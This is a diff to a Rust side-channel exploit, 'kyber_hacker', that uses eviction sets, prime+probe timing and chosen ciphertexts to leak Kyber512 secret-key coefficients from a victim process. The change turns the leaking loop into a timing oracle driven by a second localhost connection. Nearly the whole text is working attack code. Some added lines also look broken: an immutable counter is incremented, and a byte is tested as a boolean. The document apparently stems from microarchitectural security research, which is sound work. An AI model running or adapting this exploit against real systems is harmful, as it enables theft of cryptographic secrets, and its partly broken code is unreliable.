@@ -51,6 +51,7 @@ fn get_ptr_ct(ptr: *mut u64, target_ptr: u64, pos: usize, rand_mask: u64, rng: &
 
 fn kyber_hacker(
     mut stream: TcpStream,
+    mut oracle_stream: TcpStream,
     victim_array_cache_lines: &mut Vec<*mut u8>,
     repetitions: usize,
     pp_threshold: u64,
@@ -244,430 +245,312 @@ fn kyber_hacker(
         write!(pk_file, "{}\n", coeffs_vec_t[i]).unwrap();
     }
 
-    loop{
-        // Try different gadget settings
-        let mut gadget_flag = 0;
-        while pp_idx < non_conflict_set.len() {
-            // fix prime+probe channel
-            let mut pp_evset_vec_cur: Vec<*mut u8> = Vec::new();
-            evset_vec_to_evset(&victim_array_cache_lines, 
-                &mut pp_evset_vec_cur, L2_CACHE_WAYS, target_ptr_offset as usize, non_conflict_set[pp_idx]);
-            global_pp_idx = non_conflict_set[pp_idx];
-            assert_eq!(pp_evset_vec_cur.len(), L2_CACHE_WAYS);
-            let pp_evset = EvictionSet::new(&mut pp_evset_vec_cur);
-            println!("[+] P+P Evset {} Fixed!", pp_idx);
-
-            let mut pp_bad_flag = 0;
-
-            // try different target addr
-            let mut target_addr_page = victim_cl_start;
-            let mut num_target_addr_tries = 0;
-            while target_addr_page < victim_cl_end {
-                target_addr = target_addr_page + target_ptr_offset;
-                num_target_addr_tries += 1;
-                println!("[+] Try {}: Pick Target addr:{:#x} for P+P set {}", num_target_addr_tries, target_addr, pp_idx);
-
-                // generate chosen cipher (target ptr)
-                get_ptr_ct(ptr.as_mut_ptr() as *mut u64, target_addr, pointer_idx, rand_mask, &mut rng);
-                // Chosen-Cipher for no flip
-                unsafe {
-                    match pqcrystals_kyber512_ref_enc_attack(ct.as_mut_ptr() as *mut c_uchar, 
-                    ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
-                    8, 0, rand_mask) {
-                        0 => (),
-                        _ => panic!("Fail to generate Chosen-Cipher!")
-                    };
-                }
-                // Chosen-Cipher for flip
-                unsafe {
-                    match pqcrystals_kyber512_ref_enc_attack(ct_tmp.as_mut_ptr() as *mut c_uchar, 
-                    ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
-                    8, 1, rand_mask) {
-                        0 => (),
-                        _ => panic!("Fail to generate Chosen-Cipher!")
-                    };
-                }
-
-                let mut flush_group_idx = 0;
-                let mut noise_times = 0;
-                let mut succeed_times = 0;
-                while flush_group_idx < num_group {
-                    let now = Instant::now();
-                    if group_search_flag == 0 {
-                        evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
-                            (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80,
-                            flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
-                        global_flush_group_idx = flush_group_idx;
-                        println!("[+] Group {}:", flush_group_idx);
-                    } else {
-                        evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
-                            (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80,
-                            global_flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
-                        println!("[+] Group {}:", global_flush_group_idx);
-                    }
-
-                    // Initial vectors to store results
-                    let mut times_to_load_test_ptr_base = vec![];
-                    let mut times_to_load_test_ptr_atk = vec![];
-                    // Initial mode
-                    let mut mode: u8 = 0;
-
-                    for _ in 0..repetitions*2 {
-                        // send request
-                        msg_data[0] = !(__trash & MSB_MASK) as u8;
-                        stream.write_all(&msg_data).unwrap();
-            
-                        // receive pubkey from victim
-                        stream.read_exact(&mut pk).unwrap();
-        
-                        // Chose Chosen Ciphertext
-                        let ct_ptr = match mode {
-                            0 => &mut ct,
-                            0xff => &mut ct_tmp,
-                            _ => panic!("Unexpected mode during calibration!"),
-                        };
-
-                        // Resume flush thread
-                        __trash = match tx.send(__trash) {
-                            Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
-                            Err(_) => {panic!("Send Error");}
-                        };
-            
-                        compiler_fence(Ordering::SeqCst);
-                        __trash = unsafe{c_sleep(1500000, __trash)};
-            
-                        compiler_fence(Ordering::SeqCst);
-                        __trash = prime_with_dependencies(&pp_evset, __trash);
-                        ct_ptr[0] = ct_ptr[0] | (__trash & MSB_MASK) as u8;
-            
-                        // send cipher text
-                        stream.write_all(ct_ptr).unwrap();
-            
-                        // receive finish signal
-                        stream.read_exact(&mut msg_data).unwrap();
-                        __trash += msg_data[0] as u64;
-
-                        // Stop flush thread
-                        __trash = match tx.send(__trash) {
-                            Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
-                            Err(_) => {panic!("Send Error");}
-                        };
-                        compiler_fence(Ordering::SeqCst);
-            
-                        // measure microarchitectural state
-                        test_time = probe_with_dependencies(timer, &pp_evset, __trash);
-                        __trash = test_time | (__trash & MSB_MASK);
-                        // store result
-                        if mode==0 {
-                            times_to_load_test_ptr_atk.push(test_time);
-                        } else {
-                            times_to_load_test_ptr_base.push(test_time);
-                        }
-                
-                        mode = !(mode | (__trash & MSB_MASK) as u8);
-
-                        // Dumpy iteration to clean
-                        msg_data[0] = !(__trash & MSB_MASK) as u8;
-                        stream.write_all(&msg_data).unwrap();
-                        stream.read_exact(&mut pk).unwrap();
-                        stream.write_all(&ct_rand).unwrap();
-                        stream.read_exact(&mut msg_data).unwrap();
-                    }
-                    times_to_load_test_ptr_atk.sort();
-                    times_to_load_test_ptr_base.sort();
-                    let median_test_atk = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
-                    let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
-                    println!("Attack mode: {}", median_test_atk);
-                    println!("Base mode: {}", median_test_base);
-
-                    // only if atk mode activate DMP but base mode does not
-                    // if (median_test_atk > pp_threshold) && (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
-                    // Try ctswap attacker approach when median_test_atk does not have to be 
-                    // larger than pp_threshold
-                    if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
-                        succeed_times += 1;
-                        noise_times = 0;
-                        threshold_v.push((median_test_atk + median_test_base) / 2);
-                        println!("[+] Get Signal ({})", succeed_times);
-                        // add profiling
-                        profile_base_vec.append(&mut times_to_load_test_ptr_base);
-                        profile_atk_vec.append(&mut times_to_load_test_ptr_atk);
-                        if succeed_times >= 3 {
-                            gadget_flag = 1;
-                            println!("[+] Get Attack Gadgets!");
-                            break;
-                        }
-                    } else if median_test_base >= pp_threshold {
-                        threshold_v.clear();
-                        profile_base_vec.clear();
-                        profile_atk_vec.clear();
-                        noise_times += 1;
-                        succeed_times = 0;
-                        println!("[+] Noise Test Environment {}", noise_times);
-                        if noise_times >= 3 {
-                            println!("[+] Try different P+P Evset!");
-                            pp_bad_flag = 1;
-                            break;
-                        }
-                    } else if median_test_atk <= pp_threshold {
-                        threshold_v.clear();
-                        profile_base_vec.clear();
-                        profile_atk_vec.clear();
-                        succeed_times = 0;
-                        noise_times = 0;
-                        println!("[+] No signal"); 
-                        if group_search_flag == 0 {
-                            flush_group_idx += 1;
-                        } else {
-                            break;
-                        }
-                    }
-                    let trans_dur = now.elapsed();
-                    println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
-                        trans_dur.subsec_nanos());
-                }
-                if (gadget_flag == 1) || (pp_bad_flag == 1) {
-                    break;
-                }
-                target_addr_page += NATIVE_PAGE_SIZE as u64;
-            }
-            if gadget_flag == 1 {
-                break;
-            }
-            if target_addr_page >= victim_cl_end {
-                group_search_flag = 0;
-            }
-            pp_idx += 1;
-        }
-        if gadget_flag == 0 {
-            msg_data[0] = (__trash & MSB_MASK) as u8;
-            stream.write_all(&msg_data).unwrap();
-            panic!("Bad unconflict set!");
-        }
-
-        // write profile result
-        let mut prof_atk_file = File::create("kyber_1.txt").unwrap();
-        let mut prof_base_file = File::create("kyber_0.txt").unwrap();
-        for profile_idx in 0..profile_atk_vec.len() {
-            write!(prof_atk_file, "{}\n", profile_atk_vec[profile_idx]).unwrap();
-            write!(prof_base_file, "{}\n", profile_base_vec[profile_idx]).unwrap();
-        }
-        println!("[+] Storing Profile Result!");
-
-        let mut pp_evset_vec: Vec<*mut u8> = Vec::new();
+    // Try different gadget settings
+    let mut gadget_flag = 0;
+    while pp_idx < non_conflict_set.len() {
+        // fix prime+probe channel
+        let mut pp_evset_vec_cur: Vec<*mut u8> = Vec::new();
         evset_vec_to_evset(&victim_array_cache_lines, 
-            &mut pp_evset_vec, L2_CACHE_WAYS, target_ptr_offset as usize, global_pp_idx);
-        let pp_evset = EvictionSet::new(&mut pp_evset_vec);
-        write!(bench_time_file, "Compound Evset finding time: {} s\n", cevset_now.elapsed().as_secs()).unwrap();
+            &mut pp_evset_vec_cur, L2_CACHE_WAYS, target_ptr_offset as usize, non_conflict_set[pp_idx]);
+        global_pp_idx = non_conflict_set[pp_idx];
+        assert_eq!(pp_evset_vec_cur.len(), L2_CACHE_WAYS);
+        let pp_evset = EvictionSet::new(&mut pp_evset_vec_cur);
+        println!("[+] P+P Evset {} Fixed!", pp_idx);
 
-        // --------------------------------Start Leaking-----------------------------
-        println!("--------------------------------Start Leaking-----------------------------");
-        threshold_leak = threshold_v.iter().sum::<u64>() / threshold_v.len() as u64;
-        println!("[+] Leak Threshold: {}", threshold_leak);
+        let mut pp_bad_flag = 0;
 
-        // instead of creating a ciphertext here, we rely on a smart process that will submit us
-        // with them, we just need to measure the timing, i.e. we are implementing an oracle here
-        let mut oracle_stream = TcpStream::connect("127.0.0.1:3334").expect("Connect failed");
-        let oracle_repetitions = 5;
+        // try different target addr
+        let mut target_addr_page = victim_cl_start;
+        let mut num_target_addr_tries = 0;
+        while target_addr_page < victim_cl_end {
+            target_addr = target_addr_page + target_ptr_offset;
+            num_target_addr_tries += 1;
+            println!("[+] Try {}: Pick Target addr:{:#x} for P+P set {}", num_target_addr_tries, target_addr, pp_idx);
 
-        // Send random mask and masked pointer so that constructed ciphertext is decrypted into
-        // message containing victim pointer
-        stream.write_all(&rand_mask.to_le_bytes()).unwrap();
-        stream.write_all(&target_addr.to_le_bytes()).unwrap();
+            // generate chosen cipher (target ptr)
+            get_ptr_ct(ptr.as_mut_ptr() as *mut u64, target_addr, pointer_idx, rand_mask, &mut rng);
+            // Chosen-Cipher for no flip
+            unsafe {
+                match pqcrystals_kyber512_ref_enc_attack(ct.as_mut_ptr() as *mut c_uchar, 
+                ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
+                8, 0, rand_mask) {
+                    0 => (),
+                    _ => panic!("Fail to generate Chosen-Cipher!")
+                };
+            }
+            // Chosen-Cipher for flip
+            unsafe {
+                match pqcrystals_kyber512_ref_enc_attack(ct_tmp.as_mut_ptr() as *mut c_uchar, 
+                ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
+                8, 1, rand_mask) {
+                    0 => (),
+                    _ => panic!("Fail to generate Chosen-Cipher!")
+                };
+            }
 
-        let mut bad_flag = 0;
-        group_search_flag = 1;
-        let mut global_guess_result = 100;
-        let mut repetition_times = 0;
-
-        while pointer_idx < 4 {
-            // shift the flush evset
-            evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
-                (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80, 
-                global_flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
-            while poly_idx < 2 {
-                // Dump out inserted Pointer values
-                let ptr_u8: *const u64 = ptr.as_ptr() as *const u64;
-                print!("[+] Inserted Pointer sequence: ");
-                for i in 0..NUM_POINTERS {
-                    print!("{:x} ", unsafe {*ptr_u8.add(i) ^ rand_mask});
-                }
-                println!(" ");
-                let mut noisy_times = 0;
-                while bit_idx < 56 {
-                    // measure the time elapse for each window loop
-                    let now = Instant::now();
-                    // Get flip position and measure mode
-                    let flip_idx: i32 = (pointer_idx * 64 + bit_idx) as i32;
-                    let mode: u8 = ((unsafe{*ptr_u8.add(pointer_idx) ^ rand_mask} & (0x1 << bit_idx)) >> bit_idx) as u8;
-                    println!("[+] Mode {}:", mode);
-                    // Chosen-Cipher Generation
-                    let mut chosen_cipher_list = vec![];
-                    for guess in 1..9 {
-                        unsafe {
-                            match pqcrystals_kyber512_ref_enc_fake(ct.as_mut_ptr() as *mut c_uchar, 
-                            ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
-                            flip_idx, guess as i16, poly_idx as c_int, rand_mask) {
-                                0 => (),
-                                _ => panic!("Fail to generate Chosen-Cipher!")
-                            };
-                        };
-                        chosen_cipher_list.push(ct);
-                    }
-
-                    // test switch
-                    let mut guess_idx: u32 = 0;
-                    let guess_idx_mask: u32 = 8; // sk -3~3
-
-                    // Initial vectors to store results
-                    let mut times_to_load_test_ptr_atk = vec![];
-
-                    for _ in 0..repetitions * (guess_idx_mask as usize) {
-                        // send request
-                        msg_data[0] = !(__trash & MSB_MASK) as u8;
-                        stream.write_all(&msg_data).unwrap();
-
-                        // receive pubkey from victim
-                        stream.read_exact(&mut pk).unwrap();
-
-                        // Resume flush thread
-                        __trash = match tx.send(__trash) {
-                            Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
-                            Err(_) => {panic!("Send Error");}
-                        };
-
-                        __trash = unsafe{c_sleep(1500000, __trash)};
-                
-                        compiler_fence(Ordering::SeqCst);
-
-                        __trash = prime_with_dependencies(&pp_evset, __trash);
-            
-                        // send cipher text
-                        stream.write_all(&chosen_cipher_list[guess_idx as usize | ((__trash & MSB_MASK) as usize)]).unwrap();
-            
-                        // receive finish signal
-                        stream.read_exact(&mut msg_data).unwrap();
-
-                        __trash += msg_data[0] as u64;
-
-                        // Resume flush thread
-                        __trash = match tx.send(__trash) {
-                            Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
-                            Err(_) => {panic!("Send Error");}
-                        };
-                        compiler_fence(Ordering::SeqCst);
-                        // measure microarchitectural state
-                        test_time = probe_with_dependencies(timer, &pp_evset, __trash);
-                        __trash = test_time | (__trash & MSB_MASK);
-
-                        // store result
-                        times_to_load_test_ptr_atk.push(test_time);
-                
-                        guess_idx = (guess_idx + 1) % guess_idx_mask;
-                        // Dumpy iteration to clean
-                        msg_data[0] = !(__trash & MSB_MASK) as u8;
-                        stream.write_all(&msg_data).unwrap();
-                        stream.read_exact(&mut pk).unwrap();
-                        stream.write_all(&ct_rand).unwrap();
-                        stream.read_exact(&mut msg_data).unwrap();
-                    }
-                    // Compare the result and ground truth
-                    let mut global_flag = 1;
-                    let mut success_flag = 1;
-                    let mut guess_result: i16 = 0;
-                    
-                    let window_index: usize = KYBER_N as usize *poly_idx + pointer_idx * 64 + bit_idx;
-                    // write!(stats_file, "bit:{} mode:{}\n", window_index, mode).unwrap();
-                    for guess_idx in 0..guess_idx_mask as usize {
-                        let mut store_offset: usize = guess_idx;
-                        let mut positive_flag = 0;
-                        // Store Measurements
-                        let mut test_atk_tmp = vec![];
-                        for _ in 0..repetitions {
-                            let test_case = times_to_load_test_ptr_atk[store_offset];
-                            test_atk_tmp.push(test_case);
-                            // write!(stats_file, "{} ", test_case).unwrap();
-                            store_offset += guess_idx_mask as usize;
-                        }
-                        // write!(stats_file, "\n").unwrap();
-                        test_atk_tmp.sort();
-                        let median_test = test_atk_tmp[(test_atk_tmp.len() / 2 - 1) as usize];
-                        println!("get {}: {}", guess_idx, median_test);
-                        if (median_test >= threshold_leak) && (mode == 0) {
-                            positive_flag = 1;
-                        } else if (median_test < threshold_leak) && (mode == 1) {
-                            positive_flag = 1;
-                        }
-
-                        if (guess_idx == 0) && (positive_flag == 0) {
-                            success_flag = 0;
-                            break;
-                        }
-                        if (guess_idx == 7) && (positive_flag == 1) {
-                            success_flag = 0;
-                            break;
-                        }
-                        if (positive_flag == 0) && (global_flag == 1) {
-                            guess_result = guess_idx as i16 - 4;
-                            global_flag = 0;
-                        }
-                        if (global_flag == 0) && (positive_flag == 1) {
-                            success_flag = 0;
-                            break;
-                        }
-                    }
-                    
-                    if success_flag == 1 {
-                        noisy_times = 0;
-                        if guess_result != global_guess_result {
-                            repetition_times = 1;
-                            global_guess_result = guess_result;
-                        } else {
-                            repetition_times += 1;
-                        }
-                        println!("[+] Guess value: {} ({} times)", guess_result, repetition_times);
-                        if repetition_times == poll_times {
-                            repetition_times = 0;
-                            write!(result_file, "bit:{},guess:{}\n", window_index, global_guess_result).unwrap();
-                            println!("[+] Bit {}: {}(poly_idx:{},pointer_idx:{},bit_idx:{})", window_index, global_guess_result, 
-                                poly_idx, pointer_idx, bit_idx);
-                            global_guess_result = 100;
-                            bit_idx += 1;
-                        }
-                    } else {
-                        noisy_times += 1;
-                        println!("Noisy Signal {}! Try again!(poly_idx:{},pointer_idx:{},bit_idx:{})", 
-                            noisy_times, poly_idx, pointer_idx, bit_idx);
-                        if (noisy_times >= 5) && (pointer_idx == 0) && (poly_idx == 0) {
-                            bad_flag = 1;
-                            break;
-                        }
-                    }
-                    let trans_dur = now.elapsed();
-                    println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
-                        trans_dur.subsec_nanos());
-                }
-                if bad_flag == 1 {
-                    break;
+            let mut flush_group_idx = 0;
+            let mut noise_times = 0;
+            let mut succeed_times = 0;
+            while flush_group_idx < num_group {
+                let now = Instant::now();
+                if group_search_flag == 0 {
+                    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
+                        (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80,
+                        flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
+                    global_flush_group_idx = flush_group_idx;
+                    println!("[+] Group {}:", flush_group_idx);
                 } else {
-                    bit_idx = 7;
-                    poly_idx += 1;
+                    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
+                        (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80,
+                        global_flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
+                    println!("[+] Group {}:", global_flush_group_idx);
                 }
+
+                // Initial vectors to store results
+                let mut times_to_load_test_ptr_base = vec![];
+                let mut times_to_load_test_ptr_atk = vec![];
+                // Initial mode
+                let mut mode: u8 = 0;
+
+                for _ in 0..repetitions*2 {
+                    // send request
+                    msg_data[0] = !(__trash & MSB_MASK) as u8;
+                    stream.write_all(&msg_data).unwrap();
+        
+                    // receive pubkey from victim
+                    stream.read_exact(&mut pk).unwrap();
+    
+                    // Chose Chosen Ciphertext
+                    let ct_ptr = match mode {
+                        0 => &mut ct,
+                        0xff => &mut ct_tmp,
+                        _ => panic!("Unexpected mode during calibration!"),
+                    };
+
+                    // Resume flush thread
+                    __trash = match tx.send(__trash) {
+                        Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
+                        Err(_) => {panic!("Send Error");}
+                    };
+        
+                    compiler_fence(Ordering::SeqCst);
+                    __trash = unsafe{c_sleep(1500000, __trash)};
+        
+                    compiler_fence(Ordering::SeqCst);
+                    __trash = prime_with_dependencies(&pp_evset, __trash);
+                    ct_ptr[0] = ct_ptr[0] | (__trash & MSB_MASK) as u8;
+        
+                    // send cipher text
+                    stream.write_all(ct_ptr).unwrap();
+        
+                    // receive finish signal
+                    stream.read_exact(&mut msg_data).unwrap();
+                    __trash += msg_data[0] as u64;
+
+                    // Stop flush thread
+                    __trash = match tx.send(__trash) {
+                        Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
+                        Err(_) => {panic!("Send Error");}
+                    };
+                    compiler_fence(Ordering::SeqCst);
+        
+                    // measure microarchitectural state
+                    test_time = probe_with_dependencies(timer, &pp_evset, __trash);
+                    __trash = test_time | (__trash & MSB_MASK);
+                    // store result
+                    if mode==0 {
+                        times_to_load_test_ptr_atk.push(test_time);
+                    } else {
+                        times_to_load_test_ptr_base.push(test_time);
+                    }
+            
+                    mode = !(mode | (__trash & MSB_MASK) as u8);
+
+                    // Dumpy iteration to clean
+                    msg_data[0] = !(__trash & MSB_MASK) as u8;
+                    stream.write_all(&msg_data).unwrap();
+                    stream.read_exact(&mut pk).unwrap();
+                    stream.write_all(&ct_rand).unwrap();
+                    stream.read_exact(&mut msg_data).unwrap();
+                }
+                times_to_load_test_ptr_atk.sort();
+                times_to_load_test_ptr_base.sort();
+                let median_test_atk = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
+                let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
+                println!("Attack mode: {}", median_test_atk);
+                println!("Base mode: {}", median_test_base);
+
+                // only if atk mode activate DMP but base mode does not
+                // if (median_test_atk > pp_threshold) && (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
+                // Try ctswap attacker approach when median_test_atk does not have to be 
+                // larger than pp_threshold
+                if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
+                    succeed_times += 1;
+                    noise_times = 0;
+                    threshold_v.push((median_test_atk + median_test_base) / 2);
+                    println!("[+] Get Signal ({})", succeed_times);
+                    // add profiling
+                    profile_base_vec.append(&mut times_to_load_test_ptr_base);
+                    profile_atk_vec.append(&mut times_to_load_test_ptr_atk);
+                    if succeed_times >= 3 {
+                        gadget_flag = 1;
+                        println!("[+] Get Attack Gadgets!");
+                        break;
+                    }
+                } else if median_test_base >= pp_threshold {
+                    threshold_v.clear();
+                    profile_base_vec.clear();
+                    profile_atk_vec.clear();
+                    noise_times += 1;
+                    succeed_times = 0;
+                    println!("[+] Noise Test Environment {}", noise_times);
+                    if noise_times >= 3 {
+                        println!("[+] Try different P+P Evset!");
+                        pp_bad_flag = 1;
+                        break;
+                    }
+                } else if median_test_atk <= pp_threshold {
+                    threshold_v.clear();
+                    profile_base_vec.clear();
+                    profile_atk_vec.clear();
+                    succeed_times = 0;
+                    noise_times = 0;
+                    println!("[+] No signal"); 
+                    if group_search_flag == 0 {
+                        flush_group_idx += 1;
+                    } else {
+                        break;
+                    }
+                }
+                let trans_dur = now.elapsed();
+                println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
+                    trans_dur.subsec_nanos());
             }
-            if bad_flag == 1 {
+            if (gadget_flag == 1) || (pp_bad_flag == 1) {
                 break;
-            } else {
-                poly_idx = 0;
-                pointer_idx += 1;
-                // generate chosen cipher (target ptr)
-                get_ptr_ct(ptr.as_mut_ptr() as *mut u64, target_addr, pointer_idx, rand_mask, &mut rng);
             }
+            target_addr_page += NATIVE_PAGE_SIZE as u64;
         }
-        if bad_flag == 0 {
+        if gadget_flag == 1 {
             break;
         }
-        threshold_v.clear();
+        if target_addr_page >= victim_cl_end {
+            group_search_flag = 0;
+        }
+        pp_idx += 1;
     }
+    if gadget_flag == 0 {
+        msg_data[0] = (__trash & MSB_MASK) as u8;
+        stream.write_all(&msg_data).unwrap();
+        panic!("Bad unconflict set!");
+    }
+
+    // write profile result
+    let mut prof_atk_file = File::create("kyber_1.txt").unwrap();
+    let mut prof_base_file = File::create("kyber_0.txt").unwrap();
+    for profile_idx in 0..profile_atk_vec.len() {
+        write!(prof_atk_file, "{}\n", profile_atk_vec[profile_idx]).unwrap();
+        write!(prof_base_file, "{}\n", profile_base_vec[profile_idx]).unwrap();
+    }
+    println!("[+] Storing Profile Result!");
+
+    let mut pp_evset_vec: Vec<*mut u8> = Vec::new();
+    evset_vec_to_evset(&victim_array_cache_lines, 
+        &mut pp_evset_vec, L2_CACHE_WAYS, target_ptr_offset as usize, global_pp_idx);
+    let pp_evset = EvictionSet::new(&mut pp_evset_vec);
+    write!(bench_time_file, "Compound Evset finding time: {} s\n", cevset_now.elapsed().as_secs()).unwrap();
+
+    // --------------------------------Start Leaking-----------------------------
+    println!("--------------------------------Start Leaking-----------------------------");
+    threshold_leak = threshold_v.iter().sum::<u64>() / threshold_v.len() as u64;
+    println!("[+] Leak Threshold: {}", threshold_leak);
+
+    // instead of creating a ciphertext here, we rely on a smart process that will submit us
+    // with them, we just need to measure the timing, i.e. we are implementing an oracle here
+    let oracle_repetitions = 3;
+
+    // Send random mask and masked pointer so that constructed ciphertext is decrypted into
+    // message containing victim pointer
+    oracle_stream.write_all(&rand_mask.to_le_bytes()).unwrap();
+    oracle_stream.write_all(&target_addr.to_le_bytes()).unwrap();
+
+    let mut bad_flag = 0;
+    group_search_flag = 1;
+    let mut global_guess_result = 100;
+    let mut repetition_times = 0;
+
+    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
+        (victim_buf_offset as usize) & 0x3f80, 
+        global_flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
+
+    loop {
+        oracle_stream.read_exact(&mut msg_data).unwrap();
+        if msg_data[0] {
+            break;
+        }
+        oracle_stream.read_exact(&mut ct).unwrap();
+
+        let mut times_to_load_test_ptr_atk = vec![];
+        for _ in 0..oracle_repetitions {
+            msg_data[0] = !(__trash & MSB_MASK) as u8;
+            stream.write_all(&msg_data).unwrap();
+
+            // receive pubkey from victim
+            stream.read_exact(&mut pk).unwrap();
+
+            // Resume flush thread
+            __trash = match tx.send(__trash) {
+                Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
+                Err(_) => {panic!("Send Error");}
+            };
+
+            __trash = unsafe{c_sleep(1500000, __trash)};
+    
+            compiler_fence(Ordering::SeqCst);
+
+            __trash = prime_with_dependencies(&pp_evset, __trash);
+            ct[0] = ct[0] | (__trash & MSB_MASK) as u8;
+
+            // send cipher text
+            stream.write_all(ct).unwrap();
+
+            // receive finish signal
+            stream.read_exact(&mut msg_data).unwrap();
+
+            __trash += msg_data[0] as u64;
+
+            // Resume flush thread
+            __trash = match tx.send(__trash) {
+                Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
+                Err(_) => {panic!("Send Error");}
+            };
+            compiler_fence(Ordering::SeqCst);
+            // measure microarchitectural state
+            test_time = probe_with_dependencies(timer, &pp_evset, __trash);
+            __trash = test_time | (__trash & MSB_MASK);
+
+            // store result
+            times_to_load_test_ptr_atk.push(test_time);
+    
+            // Dumpy iteration to clean
+            msg_data[0] = !(__trash & MSB_MASK) as u8;
+            stream.write_all(&msg_data).unwrap();
+            stream.read_exact(&mut pk).unwrap();
+            stream.write_all(&ct_rand).unwrap();
+            stream.read_exact(&mut msg_data).unwrap();
+        }
+        let successes: u8 = 0;
+        for test_time in times_to_load_test_ptr_atk {
+            // If time is low, we got target_ptr, i.e. inequality is satisfied
+            if test_time < threshold_leak {
+                successes += 1;
+            }
+        }
+        let majority_vote: u8 = (successes * 2 > oracle_repetitions as u32) as u8;
+        msg_data[0] = majority_vote;
+        oracle_stream.write_all(&msg_data);
+    }
+    threshold_v.clear();
     // disconnect the transaction
     msg_data[0] = (__trash & MSB_MASK) as u8;
     stream.write_all(&msg_data).unwrap();
@@ -747,10 +630,17 @@ fn main() {
     eviction_set_gen64(&mut allocator, &mut victim_array_cache_lines, &timer);
     write!(bench_time_file, "64 evset gen time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();
 
+    let mut oracle_stream = match TcpStream::connect("localhost:3334") {
+        Ok(s)  => s,
+        Err(e) => {
+            println!("Failed to connect: {}", e);
+            return;
+        }
+    };
     match TcpStream::connect("localhost:3333") {
         Ok(stream) => {
             println!("Successfully connected to server in port 3333");
-            kyber_hacker(stream, &mut victim_array_cache_lines, repetitions, 
+            kyber_hacker(stream, oracle_stream, &mut victim_array_cache_lines, repetitions, 
                 pp_threshold, num_group, flush_ptr, victim_cl_start, victim_cl_end, 
                 victim_buf_offset, poll_times, &timer, &bench_time_file);
 
